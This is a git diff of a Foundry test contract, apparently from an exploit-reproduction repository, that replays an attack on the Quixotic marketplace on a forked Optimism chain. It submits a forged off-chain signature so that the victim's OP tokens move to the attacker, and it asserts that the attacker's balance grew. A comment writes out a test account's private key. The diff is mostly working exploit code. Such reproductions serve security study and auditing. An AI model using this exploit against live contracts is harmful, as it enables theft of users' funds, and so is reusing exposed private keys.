@@ -12,16 +12,15 @@ contract Attacker is Test {
     IQuixotic public quixotic = IQuixotic(address(0x065e8A87b8F11aED6fAcf9447aBe5E8C5D7502b6));
     IERC20 public op = IERC20(0x4200000000000000000000000000000000000042);
 
-    // 这里我们用到Narya的默认账户user1：
-    // address：0xa1c2b8080ed4b6f56211e0295659ef87dd454b0a884198c10384f230525d4ee8
-    // private key: 0xa1c2b8080ed4b6f56211e0295659ef87dd454b0a884198c10384f230525d4ee8
-    address public attacker = 0x29E3b139f4393aDda86303fcdAa35F60Bb7092bF;
+    // 这里我们用到Narya的账户attacker：
+    // address：0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
+    // private key: 0x97154a62cd5641a577e092d2eee7e39fcb3333dc595371a4303417dae0c2c006
+    address public attacker = 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e;
     address public victim = 0x4D9618239044A2aB2581f0Cc954D28873AFA4D7B;
 
      function setUp() public {
         vm.createSelectFork("optimism", 13_591_382);
-        nftHelper = new NFTContract();
-
+        nftHelper = new NFTContract(); // 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
         vm.label(address(nftHelper), "nftHelper");
         vm.label(address(quixotic), "quixotic");
         vm.label(address(op), "op");
@@ -29,7 +28,9 @@ contract Attacker is Test {
 
     function test_Exploit() public {
 
-        emit log_named_uint("[Before] attacker OP Balance:", op.balanceOf(attacker));
+        uint256 beforeAttack = op.balanceOf(attacker);
+        emit log_named_uint("[Before] attacker OP Balance:", beforeAttack);
+
         vm.startBroadcast(attacker);
         uint256 victimBalance = op.balanceOf(victim);
 
@@ -44,13 +45,16 @@ contract Attacker is Test {
             uint256(1), // createdAtBlockNumber
             address(0x4200000000000000000000000000000000000042), // paymentERC20
             // 这个签名需要到链下进行，计算过程放到了calSignature.sol中
-            hex"876048b2a25bc646fc50ad0576a8ebfe6d9e638be0ae35fef67e85761edde71d7642afa2d175d2ad9fb4fb93638b9887886d778064605c6f78653997b404a6a31c", // signature
+            hex"f39b078814b22a5fc0a3afd98485786acd332e1cc1bd7bc349b98dffafeb431c626776d5a6df000c4650b6e6364fb4097ad71f02c2c46134154820a65f4f77781b", // signature
             address(victim) // buyer，受害者
         );
 
         vm.stopBroadcast();
 
-        emit log_named_uint("[after] attacker OP Balance:", op.balanceOf(attacker));
+        uint256 afterAttack = op.balanceOf(attacker);
+        emit log_named_uint("[after] attacker OP Balance:", afterAttack);
+
+        assert(afterAttack > beforeAttack);
     }
    
 }
